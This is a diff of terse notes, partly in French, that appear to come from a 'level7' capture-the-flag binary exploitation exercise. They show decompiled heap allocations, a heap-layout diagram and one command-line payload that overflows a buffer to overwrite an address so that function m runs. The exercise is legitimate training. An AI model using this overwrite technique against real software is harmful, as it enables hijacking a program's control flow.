@@ -2,5 +2,35 @@
 
 080484f4 m
 
+malloc(8);
+puVar1[0] = 1;
+puVar1[1] = malloc(8);
+
+malloc(8);
+puVar3[0] = 2;
+puVar3[1] = malloc(8);
+
+00000000 puvar1 8
+00000000 pvvar2 8 
+00000000 puvar3 8
+00000000 pvvar2 8
+
+
 ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print"\xf4\x84\x04\x08"')
 
+
++-----------------------+  <- Bloc puVar1 (8 octets)
+|    0x00000001        |  <- Contenu de puVar1 (4 octets)
+|-----------------------|
+|   Pointeur vers pvVar2|  <- Contenu de puVar1 + 4 (4 octets)
++-----------------------+
+|    0x00000002        |  <- Contenu de puVar3 (4 octets)
+|-----------------------|
+|   Pointeur vers pvVar2|  <- Contenu de puVar3 + 4 (4 octets)
++-----------------------+
+|                       |  <- Zone mémoire pour pvVar2 (8 octets)
+|                       |
+|-----------------------|
+|                       |  <- Zone mémoire pour pvVar2 (8 octets)
+|                       |
++-----------------------+
